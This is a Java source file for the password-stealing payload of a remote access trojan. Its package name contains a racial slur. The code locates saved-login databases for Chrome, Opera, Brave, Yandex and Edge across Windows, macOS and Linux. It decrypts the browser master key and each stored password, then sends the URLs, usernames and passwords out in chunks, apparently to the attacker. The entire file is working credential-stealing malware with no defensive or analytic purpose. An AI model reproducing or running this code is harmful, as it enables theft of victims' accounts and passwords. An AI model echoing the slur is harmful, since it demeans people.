package me.nigger.rat.payload.impl;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32Util;
import me.nigger.rat.payload.api.Payload;
import me.nigger.rat.payload.api.Sender;
import me.nigger.rat.util.Message;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.nio.file.Files;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.util.Arrays;
import java.util.Base64;
import java.util.stream.Collectors;
import java.util.stream.Stream;

public final class Passwords implements Payload {
    @Override // made by yoink aka the cryptography god
    public void execute() throws Exception {
        Stream.of(new String[][]{
                {localAppdata() + "/Google/Chrome/User Data/Local State", localAppdata() + "/Google/Chrome/User Data/Default/Login Data"},
                {home() + "/Library/Application Support/Google/Chrome/User Data/Local State", home() + "/Library/Application Support/Google/Chrome/User Data/Default/Login Data"},
                {home() + "/.config/google-chrome/Local State", home() + "/.config/google-chrome/Default/Login Data"},
                {appdata() + "/Opera Software/Opera Stable/Local State", appdata() + "/Opera Software/Opera Stable/Default/Login Data"},
                {home() + "/Library/Application Support/Opera/Opera/Local State", "/Library/Application Support/Opera/Opera/Default/Login Data"},
                {home() + "/.config/opera/Local State", home() + "/.config/opera/Default/Login Data"},
                {localAppdata() + "/BraveSoftware/Brave-Browser/Local State", localAppdata() + "/BraveSoftware/Brave-Browser/Default/Login Data"},
                {home() + "/Library/Application Support/BraveSoftware/Brave-Browser/Local State", home() + "/Library/Application Support/BraveSoftware/Brave-Browser/Default/Login Data"},
                {home() + "/.config/BraveSoftware/Brave-Browser/Local State", home() + "/.config/BraveSoftware/Brave-Browser/Default/Login Data"},
                {localAppdata() + "/Yandex/YandexBrowser/User Data/Local State", localAppdata() + "/Yandex/YandexBrowser/User Data/Default/Login Data"},
                {home() + "/Library/Application Support/Yandex/YandexBrowser/Local State", home() + "/Library/Application Support/Yandex/YandexBrowser/Default/Login Data"},
                {home() + "/.config/Yandex/YandexBrowser/Local State", home() + "/.config/Yandex/YandexBrowser/Default/Login Data"},
                {localAppdata() + "/Microsoft/Edge/User Data/Local State", localAppdata() + "/Microsoft/Edge/User Data/Default/Login Data"},
                {home() + "/Library/Application Support/Microsoft/Edge/Local State", home() + "/Library/Application Support/Microsoft/Edge/Default/Login Data"},
                {home() + "/.config/Microsoft/Edge/Local State", home() + "/.config/Microsoft/Edge/Default/Login Data"}
        }).collect(Collectors.toMap(data -> new File(data[0]), data -> new File(data[1]))).entrySet().stream().filter(entry -> entry.getKey().exists() && entry.getValue().exists()).forEach((entry) -> {

            try {
                JsonObject json = new JsonParser().parse(new String(Files.readAllBytes(entry.getKey().toPath()))).getAsJsonObject();

                byte[] key = Base64.getDecoder().decode(json.get("os_crypt").getAsJsonObject().get("encrypted_key").getAsString());
                key = Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(key, 5, key.length));

                ResultSet re = DriverManager.getConnection("jdbc:sqlite:" + entry.getValue().getAbsolutePath()).prepareStatement("SELECT `origin_url`,`username_value`,`password_value` from `logins`").executeQuery();
                StringBuilder builder = new StringBuilder();

                while (re.next()) {
                    String url = new String(re.getBytes("origin_url"));
                    String username = new String(re.getBytes("username_value"));
                    String password = decrypt(re.getBytes("password_value"), key);

                    if (!url.isEmpty() && !username.isEmpty() && !password.isEmpty()) builder.append(url).append(" | ").append(username).append(" | ").append(password).append("\n");
                }

                for (String s : builder.toString().split("(?<=\\G.{1900})")) {
                    if (s.isEmpty()) continue;
                    Sender.send(new Message.Builder("Passwords").setDescription(s).build());
                }
            } catch (Exception e) {
                Sender.send(new Message.Builder("Passwords").setDescription(e.getMessage()).build());
            }
        });
    }

    private String decrypt(byte[] password, byte[] key) {
        try {
            byte[] iv = Arrays.copyOfRange(password, 3, 15);
            password = Arrays.copyOfRange(password, 15, password.length);
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, iv));
            return new String(cipher.doFinal(password));
        } catch (Exception e) {
            return e.getMessage();
        }
    }
}
// sippin on some sizzurp,,,
